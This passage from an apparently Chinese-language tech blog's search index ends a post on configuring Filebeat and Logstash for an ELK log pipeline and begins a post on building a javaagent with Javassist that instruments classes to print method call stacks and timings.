class=\"attr\">multiline.negate:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">      <span class=\"attr\">multiline.match:</span> <span class=\"string\">after</span></span><br><span class=\"line\">      <span class=\"comment\"># 增加字段、用来标示日志来源，在采集多个项目日志时有用</span></span><br><span class=\"line\">      <span class=\"attr\">fields:</span></span><br><span class=\"line\">        <span class=\"attr\">server_name:</span> <span class=\"string\">storemanager-api</span></span><br><span class=\"line\">      <span class=\"attr\">fields_under_root:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"attr\">output:</span></span><br><span class=\"line\">  <span class=\"attr\">logstash:</span></span><br><span class=\"line\">      <span class=\"comment\">#本机Logstash地址</span></span><br><span class=\"line\">      <span class=\"attr\">hosts:</span> [<span class=\"string\">&quot;10.211.240.162:4560&quot;</span>]</span><br></pre></td></tr></table></figure>\n<p>filebeat其他配置可以参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucWNsb3VkLmNvbS9jb21tdW5pdHkvYXJ0aWNsZS8yNjg3MjA=\">Filebeat安装部署及配置详解<i class=\"fa fa-external-link-alt\"></i></span></p>\n<p>Logstash配置：<br>新增文件tomcat_log4j.conf</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 开放输入端口</span><br><span class=\"line\">input&#123;</span><br><span class=\"line\">  beats &#123;</span><br><span class=\"line\">    host =&gt; <span class=\"string\">&quot;0.0.0.0&quot;</span></span><br><span class=\"line\">    port =&gt; <span class=\"number\">4560</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">filter &#123;</span><br><span class=\"line\">  #判断日志来源、通过来源分开处理</span><br><span class=\"line\">  <span class=\"keyword\">if</span> [server_name] == <span class=\"string\">&quot;manager-api&quot;</span>&#123;</span><br><span class=\"line\">    #处理日志</span><br><span class=\"line\">    grok &#123;</span><br><span class=\"line\">      #lo4j日志配置为：log4j.appender.logstash.layout.ConversionPattern=%d [%t] %-5p [%c] - %m%n</span><br><span class=\"line\">      # 需要对日志进行拆分</span><br><span class=\"line\">      match =&gt; &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;message&quot;</span> =&gt; <span class=\"string\">&quot;(?&lt;timestamp&gt;[0-9]&#123;4&#125;-[0-9]&#123;2&#125;-[0-9]&#123;2&#125; [0-9]&#123;2&#125;:[0-9]&#123;2&#125;:[0-9]&#123;2&#125;,[0-9]&#123;3&#125;) \\[(?&lt;thread_name&gt;.*)\\] (?&lt;log_level&gt;.*) \\[(?&lt;class_name&gt;.*)\\] - (?&lt;message&gt;.*)&quot;</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      overwrite =&gt; [ <span class=\"string\">&quot;message&quot;</span> ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    date &#123;</span><br><span class=\"line\">      match =&gt; [<span class=\"string\">&#x27;logtime&#x27;</span>, <span class=\"string\">&quot;yyyy-MM-dd HH:mm:ss,SSS&quot;</span>]</span><br><span class=\"line\">      locale =&gt; <span class=\"string\">&quot;cn&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#日志输出</span><br><span class=\"line\">output &#123;</span><br><span class=\"line\">  stdout&#123;</span><br><span class=\"line\">    codec =&gt; rubydebug</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  #实际情况是需要依据日志来源建立不同的索引，不能全部混在一起</span><br><span class=\"line\">  elasticsearch&#123;</span><br><span class=\"line\">    hosts =&gt;[<span class=\"string\">&quot;127.0.0.1:9200&quot;</span>]</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>分别启动4个服务、启动Logstash需要使用：**.&#x2F;bin&#x2F;logstash -f tomcat_log4j.conf** 指定配置文件。<br>之后打开浏览器localhost:5601查看日志信息。</p>\n<p>后续如果需要使用，可以控制权限之类，还有很多玩法。<br>在使用grok写表达式时，可以通过<em><span class=\"exturl\" data-url=\"aHR0cDovL2dyb2tkZWJ1Zy5oZXJva3VhcHAuY29tLw==\">http://grokdebug.herokuapp.com/<i class=\"fa fa-external-link-alt\"></i></span></em> 测试表达式</p>\n<p>参考：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2MueW9ueW91Y2xvdWQuY29tL2RvYy9sb2dzdGFzaC1iZXN0LXByYWN0aWNlLWNuL2luZGV4Lmh0bWw=\">Logstash 最佳实践<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbGtndWlkZS5lbGFzdGljc2VhcmNoLmNuLw==\">ELKstack 中文指南<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy55d25kcy5jb20vP3A9OTc3Ng==\">ELK技术实战-安装Elk 5.x平台<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n","categories":["ELK"],"tags":["Elasticsearch","Kibana","Logstash","日志查询"]},{"title":"通过javaagent打印调用栈","url":"/2018/01/11/%E9%80%9A%E8%BF%87javaagent%E6%89%93%E5%8D%B0%E8%B0%83%E7%94%A8%E6%A0%88/","content":"<p>在平常工作中有时候需要查看方法的调用时间，或者需要知道某个业务的调用逻辑，需要些大量侵入式代码来完成。现在可以使用javaagent在main方法前执行，然后加载的类，通过字节码技术，在类中加入需要的代码。</p>\n<span id=\"more\"></span>\n<h3 id=\"构建agent项目\"><a href=\"#构建agent项目\" class=\"headerlink\" title=\"构建agent项目\"></a>构建agent项目</h3><p>1、 新建maven jar项目<br>pom.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">project</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">modelVersion</span>&gt;</span>4.0.0<span class=\"tag\">&lt;/<span class=\"name\">modelVersion</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.whh<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>javaagentdemo<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.0-SNAPSHOT<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">packaging</span>&gt;</span>jar<span class=\"tag\">&lt;/<span class=\"name\">packaging</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>javaagentdemo<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">url</span>&gt;</span>http://maven.apache.org<span class=\"tag\">&lt;/<span class=\"name\">url</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class=\"tag\">&lt;/<span class=\"name\">project.build.sourceEncoding</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">properties</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">        <span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">        &lt;dependency&gt;</span></span><br><span class=\"line\"><span class=\"comment\">            &lt;groupId&gt;org.apache.bcel&lt;/groupId&gt;</span></span><br><span class=\"line\"><span class=\"comment\">            &lt;artifactId&gt;bcel&lt;/artifactId&gt;</span></span><br><span class=\"line\"><span class=\"comment\">            &lt;version&gt;6.2&lt;/version&gt;</span></span><br><span class=\"line\"><span class=\"comment\">        &lt;/dependency&gt;</span></span><br><span class=\"line\"><span class=\"comment\">      --&gt;</span></span><br><span class=\"line\">      <span class=\"comment\">&lt;!-- 字节码增强 --&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.javassist<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>javassist<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>3.21.0-GA<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">          <span class=\"comment\">&lt;!-- 打包依赖jar --&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.maven.plugins<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-jar-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">archive</span>&gt;</span></span><br><span class=\"line\">                        <span class=\"tag\">&lt;<span class=\"name\">manifestFile</span>&gt;</span>src/main/resources/META-INF/MANIFEST.MF<span class=\"tag\">&lt;/<span class=\"name\">manifestFile</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;/<span class=\"name\">archive</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.maven.plugins<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">                <span class=\"comment\">&lt;!-- 用这个maven打包插件 --&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-shade-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.3<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">executions</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">execution</span>&gt;</span></span><br><span class=\"line\">                        <span class=\"tag\">&lt;<span class=\"name\">phase</span>&gt;</span>package<span class=\"tag\">&lt;/<span class=\"name\">phase</span>&gt;</span></span><br><span class=\"line\">                        <span class=\"tag\">&lt;<span class=\"name\">goals</span>&gt;</span></span><br><span class=\"line\">                            <span class=\"tag\">&lt;<span class=\"name\">goal</span>&gt;</span>shade<span class=\"tag\">&lt;/<span class=\"name\">goal</span>&gt;</span></span><br><span class=\"line\">                        <span class=\"tag\">&lt;/<span class=\"name\">goals</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;/<span class=\"name\">execution</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">executions</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.maven.plugins<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-compiler-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>3.6.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">source</span>&gt;</span>1.8<span class=\"tag\">&lt;/<span class=\"name\">source</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">target</span>&gt;</span>1.8<span class=\"tag\">&lt;/<span class=\"name\">target</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">project</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>2、 新建java文件、新增premain方法如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">PreMain</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">premain</span><span class=\"params\">(String args, Instrumentation instrumentation)</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;premain&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>3、resource下新建META-INF&#x2F;MANIFEST.MF</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Manifest-Version: 1.0</span><br><span class=\"line\">Premain-Class: com.whh.PreMain</span><br><span class=\"line\">Can-Redefine-Classes: true</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ul>\n<li>注意的是最后是一个空行，没有会报错。</li>\n</ul>\n<p>4、 打包生成jar<br>5、 随便写一个Main启动测试、在启动时添加VM参数：-javaagent:javaagentdemo-1.0-SNAPSHOT.jar。会发现PreMain中premain会被执行。</p>\n<h3 id=\"字节码修改\"><a href=\"#字节码修改\" class=\"headerlink\" title=\"字节码修改\"></a>字节码修改</h3><p>我们需要对加载的类做字节码修改，所以需要用到Instrumentation。<br>新建类TransformerDemo.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.security.ProtectionDomain;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.ArrayList;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * TestTransformer</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by whhxz on 2018/1/9.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TransformerDemo</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">ClassFileTransformer</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> ThreadLocal&lt;List&lt;MethodStackInfo&gt;&gt; inMethodStack = ThreadLocal.withInitial(ArrayList::<span class=\"keyword\">new</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 方法调用前调用，记录进入方法时间</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> className</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> method</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">startMethod</span><span class=\"params\">(String className, String method)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">now</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">        <span class=\"type\">MethodStackInfo</span> <span class=\"variable\">methodStackInfo</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">MethodStackInfo</span>(className + <span class=\"string\">&quot;.&quot;</span> + method);</span><br><span class=\"line\">        methodStackInfo.setStartTime(now);</span><br><span class=\"line\">        List&lt;MethodStackInfo&gt; inStack = inMethodStack.get();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (inStack.size() == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            methodStackInfo.setDepth(<span class=\"number\">0</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> inStack.size() - <span class=\"number\">1</span>; i &gt;= <span class=\"number\">0</span>; i--) &#123;</span><br><span class=\"line\">                <span class=\"type\">MethodStackInfo</span> <span class=\"variable\">lastInStack</span> <span class=\"operator\">=</span> inStack.get(i);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (lastInStack.getEndTime() == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                    methodStackInfo.setDepth(lastInStack.getDepth() + <span class=\"number\">1</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        inStack.add(methodStackInfo);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 出方法时调用，记录出方法时间</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> className</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> method</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">endMethod</span><span class=\"params\">(String className, String method)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">now</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">        List&lt;MethodStackInfo&gt; inStack = inMethodStack.get();</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> inStack.size() - <span class=\"number\">1</span>; i &gt;= <span class=\"number\">0</span>; i--) &#123;</span><br><span class=\"line\">            <span class=\"type\">MethodStackInfo</span> <span class=\"variable\">methodStackInfo</span> <span class=\"operator\">=</span> inStack.get(i);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (methodStackInfo. getEndTime() == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                methodStackInfo.setEndTime(now);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//最外层已经出栈，打印相关信息</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (inStack.get(<span class=\"number\">0</span>).getName().equals(className + <span class=\"string\">&quot;.&quot;</span> + method)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (MethodStackInfo methodStackInfo : inStack) &#123;</span><br><span class=\"line\">                <span class=\"type\">StringBuilder</span> <span class=\"variable\">sb</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>();</span><br><span class=\"line\">                sb.append(<span class=\"string\">&quot;|&quot;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; methodStackInfo.getDepth(); i++) &#123;</span><br><span class=\"line\">                    sb.append(<span class=\"string\">&quot;  |&quot;</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                sb.append(<span class=\"string\">&quot;__&quot;</span>).append(methodStackInfo.getName())</span><br><span class=\"line\">                        .append(<span class=\"string\">&quot; :&quot;</span>)</span><br><span class=\"line\">                        .append(methodStackInfo.getEndTime() - methodStackInfo.getStartTime())</span><br><span class=\"line\">                        .append(<span class=\"string\">&quot; ms&quot;</span>);</span><br><span class=\"line\">                System.out.println(sb.toString());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            inMethodStack.remove();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class=\"type\">byte</span>[] classfileBuffer) <span class=\"keyword\">throws</span> IllegalClassFormatException &#123;</span><br><span class=\"line\">        className = className.replaceAll(<span class=\"string\">&quot;/&quot;</span>, <span class=\"string\">&quot;.&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//过滤需要处理的类</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!className.contains(<span class=\"string\">&quot;com.whh.Main&quot;</span>)</span><br><span class=\"line\">                || className.contains(<span class=\"string\">&quot;$$&quot;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//获取加载的字节码</span></span><br><span class=\"line\">            <span class=\"type\">ClassPool</span> <span class=\"variable\">classPool</span> <span class=\"operator\">=</span> ClassPool.getDefault();</span><br><span class=\"line\">            classPool.insertClassPath(<span class=\"keyword\">new</span> <span class=\"title class_\">LoaderClassPath</span>(loader));</span><br><span class=\"line\">            <span class=\"type\">CtClass</span> <span class=\"variable\">ctClass</span> <span class=\"operator\">=</span> classPool.get(className);</span><br><span class=\"line\">            <span class=\"comment\">//修改方法字节码，新增插入的代码</span></span><br><span class=\"line\">            CtMethod[] declaredMethods = ctClass.getDeclaredMethods();</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (CtMethod declaredMethod : declaredMethods) &#123;</span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">methodName</span> <span class=\"operator\">=</span> declaredMethod.getName();</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (declaredMethod.isEmpty()) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                declaredMethod.insertBefore(<span class=\"string\">&quot;com.whh.transformer.TestTransformer.startMethod(\\&quot;&quot;</span> + className + <span class=\"string\">&quot;\\&quot;, \\&quot;&quot;</span> + methodName + <span class=\"string\">&quot;\\&quot;);&quot;</span>);</span><br><span class=\"line\">                declaredMethod.insertAfter(<span class=\"string\">&quot;com.whh.transformer.TestTransformer.endMethod(\\&quot;&quot;</span> + className + <span class=\"string\">&quot;\\&quot;, \\&quot;&quot;</span> + methodName + <span class=\"string\">&quot;\\&quot;);&quot;</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">/*for (CtMethod declaredMethod : declaredMethods) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">                String oldName = declaredMethod.getName();</span></span><br><span class=\"line\"><span class=\"comment\">                declaredMethod.setName(oldName + &quot;$old&quot;);</span></span><br><span class=\"line\"><span class=\"comment\">                CtMethod newMethod = CtNewMethod.copy(declaredMethod, oldName, ctClass, null);</span></span><br><span class=\"line\"><span class=\"comment\">                StringBuilder sb = new StringBuilder();</span></span><br><span class=\"line\"><span class=\"comment\">                sb.append(&quot;&#123;&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">                        .append(&quot;\\nlong startTime = System.currentTimeMillis();\\n&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">                        .append(oldName).append(&quot;$old($$);\\n&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">                        .append(&quot;\\nlong endTime = System.currentTimeMillis();\\n&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">                        .append(&quot;\\nSystem.out.println(\\&quot;~~~~~~~~this method &quot;)</span></span><br><span class=\"line\"><span class=\"comment\">                        .append(oldName)</span></span><br><span class=\"line\"><span class=\"comment\">                        .append(&quot; cost:\\&quot; +(endTime - startTime) +\\&quot;ms.\\&quot;);&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">                        .append(&quot;&#125;&quot;);</span></span><br><span class=\"line\"><span class=\"comment\">                newMethod.setBody(sb.toString());</span></span><br><span class=\"line\"><span class=\"comment\">                ctClass.addMethod(newMethod);</span></span><br><span class=\"line\"><span class=\"comment\">            &#125;*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> ctClass.toBytecode();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (NotFoundException | CannotCompileException | IOException e) &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;~~~~~~~~~~&quot;</span> + className);</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//MethodStackInfo存储方法调用信息</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MethodStackInfo</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">long</span> startTime;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">long</span> endTime;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> depth;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">MethodStackInfo</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">MethodStackInfo</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">MethodStackInfo</span><span class=\"params\">(String name, <span class=\"type\">long</span> startTime, <span class=\"type\">long</span> endTime, <span class=\"type\">int</span> depth)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.startTime = startTime;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.endTime = endTime;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.depth = depth;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getName</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setName</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span 